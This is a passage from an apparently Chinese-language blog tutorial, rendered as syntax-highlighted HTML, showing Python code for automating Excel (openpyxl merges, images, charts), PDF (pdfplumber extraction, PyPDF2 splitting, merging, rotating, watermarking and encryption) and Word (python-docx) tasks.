class="token punctuation">)</span>          <span class="token comment">#方法一</span>sheet<span class="token punctuation">.</span>merge_cells<span class="token punctuation">(</span>start_row<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>start_column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>end_row<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>end_column<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#方法二</span>sheet<span class="token punctuation">.</span>unmerge_cells<span class="token punctuation">(</span><span class="token string">'C1:D2'</span><span class="token punctuation">)</span>          <span class="token comment">#方法一</span>sheet<span class="token punctuation">.</span>unmerge_cells<span class="token punctuation">(</span>start_row<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>start_column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>end_row<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>end_column<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#方法二</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="生成图表"><a href="#生成图表" class="headerlink" title="生成图表"></a>生成图表</h3><h4 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>drawing<span class="token punctuation">.</span>image <span class="token keyword">import</span> Imageworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>logo<span class="token operator">=</span>Image<span class="token punctuation">(</span><span class="token string">"landscape.jpg"</span><span class="token punctuation">)</span>logo<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">100</span>logo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">100</span>sheet<span class="token punctuation">.</span>add_image<span class="token punctuation">(</span>logo<span class="token punctuation">,</span><span class="token string">"C1"</span><span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="插入条形图"><a href="#插入条形图" class="headerlink" title="插入条形图"></a>插入条形图</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>chart <span class="token keyword">import</span> LineChart<span class="token punctuation">,</span>Referenceworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'sheet1'</span><span class="token punctuation">]</span>chart<span class="token operator">=</span>LineChart<span class="token punctuation">(</span><span class="token punctuation">)</span>data<span class="token operator">=</span>Reference<span class="token punctuation">(</span>worksheet<span class="token operator">=</span>sheet<span class="token punctuation">,</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>max_row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>min_col<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>max_col<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">)</span>categories<span class="token operator">=</span>Reference<span class="token punctuation">(</span>sheet<span class="token punctuation">,</span>min_row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>min_col<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>max_col<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">)</span>chart<span class="token punctuation">.</span>add_data<span class="token punctuation">(</span>data<span class="token punctuation">,</span>from_rows<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>titles_from_data<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>chart<span class="token punctuation">.</span>set_categories<span class="token punctuation">(</span>categories<span class="token punctuation">)</span>sheet<span class="token punctuation">.</span>add_chart<span class="token punctuation">(</span>chart<span class="token punctuation">,</span><span class="token string">"B5"</span><span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f1.png"></p><blockquote><p>柱状图同理，BarChart()</p></blockquote><h2 id="处理PDF文件"><a href="#处理PDF文件" class="headerlink" title="处理PDF文件"></a>处理PDF文件</h2><h3 id="提取文字、表格"><a href="#提取文字、表格" class="headerlink" title="提取文字、表格"></a>提取文字、表格</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pdfplumber<span class="token keyword">with</span> pdfplumber<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pdf"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pdf<span class="token punctuation">:</span>    <span class="token keyword">for</span> page <span class="token keyword">in</span> pdf<span class="token punctuation">.</span>pages<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>page<span class="token punctuation">.</span>extract_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>表格为extract_tables()</p></blockquote><p>提取表格时还可以设置一些参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pdfplumber<span class="token keyword">with</span> pdfplumber<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pdf"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pdf<span class="token punctuation">:</span>    table_page<span class="token operator">=</span>pdf<span class="token punctuation">.</span>pages<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    table<span class="token operator">=</span>table_page<span class="token punctuation">.</span>extract_table<span class="token punctuation">(</span>        table_settings<span class="token operator">=</span><span class="token punctuation">&#123;</span>             <span class="token string">"vertical_strategy"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span>            <span class="token string">"horizontal_strategy"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="提取的表格写入excel"><a href="#提取的表格写入excel" class="headerlink" title="提取的表格写入excel"></a>提取的表格写入excel</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pdfplumber<span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> Workbook<span class="token keyword">with</span> pdfplumber<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pdf"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pdf<span class="token punctuation">:</span>    table_page<span class="token operator">=</span>pdf<span class="token punctuation">.</span>pages<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    table<span class="token operator">=</span>table_page<span class="token punctuation">.</span>extract_table<span class="token punctuation">(</span>        table_settings<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"vertical_strategy"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span>            <span class="token string">"horizontal_strategy"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>    workbook<span class="token operator">=</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>    sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>active    <span class="token keyword">for</span> row <span class="token keyword">in</span> table<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> row<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">:</span>  <span class="token comment">#将列表中的每个元素都以字符串方式连接起来,起到去除空行的作用</span>            sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">)</span>    workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'1.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>[str(item) for item in row] 快速生成一个列表</p></blockquote><h3 id="合并前几列单词"><a href="#合并前几列单词" class="headerlink" title="合并前几列单词"></a>合并前几列单词</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">new_row<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>new_row<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token keyword">if</span> item <span class="token keyword">else</span> <span class="token string">''</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> row<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>new_row<span class="token operator">+=</span>row<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>new_table<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_row<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>行内条件判断</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python">x<span class="token operator">=</span><span class="token number">5</span>y<span class="token operator">=</span>x<span class="token operator">*</span><span class="token number">2</span> <span class="token keyword">if</span> x<span class="token operator">&lt;</span><span class="token number">10</span> <span class="token keyword">else</span> <span class="token number">20</span><span class="token keyword">print</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="PDF合并及分割"><a href="#PDF合并及分割" class="headerlink" title="PDF合并及分割"></a>PDF合并及分割</h3><h4 id="分割"><a href="#分割" class="headerlink" title="分割"></a>分割</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'./1/lab-page-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>page<span class="token punctuation">&#125;</span></span><span class="token string">.pdf'</span></span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>        pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'./1/lab-page-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>page<span class="token punctuation">&#125;</span></span><span class="token string">.pdf'</span></span><span class="token punctuation">)</span>    <span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'merge.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="旋转及排序PDF"><a href="#旋转及排序PDF" class="headerlink" title="旋转及排序PDF"></a>旋转及排序PDF</h3><h4 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span>page<span class="token operator">=</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rotateClockwise<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span>page<span class="token operator">=</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rotateCounterClockwise<span class="token punctuation">(</span><span class="token number">90</span><span class="token punctuation">)</span>pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'rotated.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment">#从最后一页开始，到第一页，每次递减一页</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'reordered.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="批量加水印"><a href="#批量加水印" class="headerlink" title="批量加水印"></a>批量加水印</h3><p>打开word，制作一个只有水印的页面，（将图片设为浮于文字上方即可自由拖动图片）保存为PDF</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriter<span class="token keyword">from</span> copy <span class="token keyword">import</span> copywatermark_pdf<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'shuiyin.pdf'</span><span class="token punctuation">)</span>watermark_page<span class="token operator">=</span>watermark_pdf<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>pdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    original_page<span class="token operator">=</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span>    new_page<span class="token operator">=</span>copy<span class="token punctuation">(</span>watermark_page<span class="token punctuation">)</span>    new_page<span class="token punctuation">.</span>mergePage<span class="token punctuation">(</span>original_page<span class="token punctuation">)</span>           <span class="token comment">#注意merge顺序，下面的内容.mergePage(出现在上面的内容)</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>new_page<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'shuiyined.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="批量加解密"><a href="#批量加解密" class="headerlink" title="批量加解密"></a>批量加解密</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriter<span class="token keyword">from</span> copy <span class="token keyword">import</span> copypdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'1.pdf'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span>pdf_writer<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span><span class="token string">'ezy'</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'encrypted.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PyPDF2 <span class="token keyword">import</span> PdfFileReader<span class="token punctuation">,</span>PdfFileWriterpdf_reader<span class="token operator">=</span>PdfFileReader<span class="token punctuation">(</span><span class="token string">'encrypted.pdf'</span><span class="token punctuation">)</span>pdf_reader<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span><span class="token string">'ezy'</span><span class="token punctuation">)</span>pdf_writer<span class="token operator">=</span>PdfFileWriter<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> page <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getNumPages<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>addPage<span class="token punctuation">(</span>pdf_reader<span class="token punctuation">.</span>getPage<span class="token punctuation">(</span>page<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'decrypted.pdf'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out<span class="token punctuation">:</span>    pdf_writer<span class="token punctuation">.</span>write<span class="token punctuation">(</span>out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="处理word文件"><a href="#处理word文件" class="headerlink" title="处理word文件"></a>处理word文件</h2><h3 id="word文档结构"><a href="#word文档结构" class="headerlink" title="word文档结构"></a>word文档结构</h3><p>Document: 文档<br>Paragraph: 段落<br>Run: 文字块，样式相同的为一个块    </p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f2.png"></p><h3 id="提取文字"><a href="#提取文字" class="headerlink" title="提取文字"></a>提取文字</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx <span class="token keyword">import</span> Documentdoc<span class="token operator">=</span>Document<span class="token punctuation">(</span><span class="token string">'1.docx'</span><span class="token punctuation">)</span><span class="token keyword">for</span> paragraph <span class="token keyword">in</span> doc<span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>提取文字块</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx <span class="token keyword">import</span> Documentdoc<span class="token operator">=</span>Document<span class="token punctuation">(</span><span class="token string">'1.docx'</span><span class="token punctuation">)</span>paragraph<span class="token operator">=</span>doc<span class="token punctuation">.</span>paragraphs<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>runs<span class="token operator">=</span>paragraph<span class="token punctuation">.</span>runs<span class="token keyword">for</span> run <span class="token keyword">in</span> runs<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="向word中写入内容"><a href="#向word中写入内容" class="headerlink" title="向word中写入内容"></a>向word中写入内容</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> docx <span class="token keyword">import</span> Document<span class="token keyword">from</span> docx<span class="token punctuation">.</span>shared <span class="token keyword">import</span> Cmdoc<span class="token operator">=</span>Document<span class="token punctuation">(</span><span class="token punctuation">)</span>doc<span class="token punctuation">.</span>add_heading<span class="token punctuation">(</span><span class="token string">'first heading'</span><span class="token punctuation">,</span>level<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token comment">#添加标题</span>paragraph1<span class="token operator">=</span>doc<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token string">'paragra1'</span><span class="token punctuation">)</span>        <span class="token comment">#添加段落</span>paragraph2<span class="token operator">=</span>doc<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token string">'paragra2'</span><span class="token punctuation">)</span>paragraph3<span class="token operator">=</span>doc<span class="token punctuation">.</span>add_paragraph<span class="token punctuation">(</span><span class="token punctuation">)</span>                  <span class="token comment">#添加文字块</span>paragraph3<span class="token punctuation">.</span>add_run<span class="token punctuation">(</span><span class="token string">'加粗'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bold<span class="token operator">=</span><span class="token boolean">True</span>paragraph3<span class="token punctuation">.</span>add_run<span class="token punctuation">(</span><span class="token string">'普通'</span><span class="token punctuation">)</span>paragraph3<span class="token punctuation">.</span>add_run<span class="token punctuation">(</span><span class="token string">'斜体'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>italic<span class="token operator">=</span><span class="token boolean">True</span>doc<span class="token punctuation">.</span>add_page_break<span class="token punctuation">(</span><span class="token punctuation">)</span>                            <span class="token comment">#添加分页</span>doc<span class="token punctuation">.</span>add_picture<span class="token punctuation">(</span><span class="token string">'landscape.jpg'</span><span class="token punctuation">,</span>width<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>height<span class="token operator">=</span>Cm<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment">#添加图片，需要导入Cm模块才能使用可选参数width,height，只给一个宽度或高度，另一个的尺寸会自动计算</span>records<span class="token operator">=</span><span class="token punctuation">[</span>    <span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">,</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">'grade'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token string">'Li lei'</span><span class="token punctuation">,</span><span class="token number">95</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span><span class="token string">'Han meimei'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span><span class="token string">'Ma dongmei'</span><span class="token punctuation">,</span><span class="token number">98</span><span class="token punctuation">]</span><span class="token punctuation">]</span>table <span class="token operator">=</span>doc<span class="token punctuation">.</span>add_table<span class="token punctuation">(</span>rows<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>cols<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>             <span class="token comment">#添加表格</span><span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cells<span class="token operator">=</span>table<span class="token punctuation">.</span>rows<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">.</span>cells    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        cells<span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token operator">=</span><span class="token builtin">str</span><span class="token 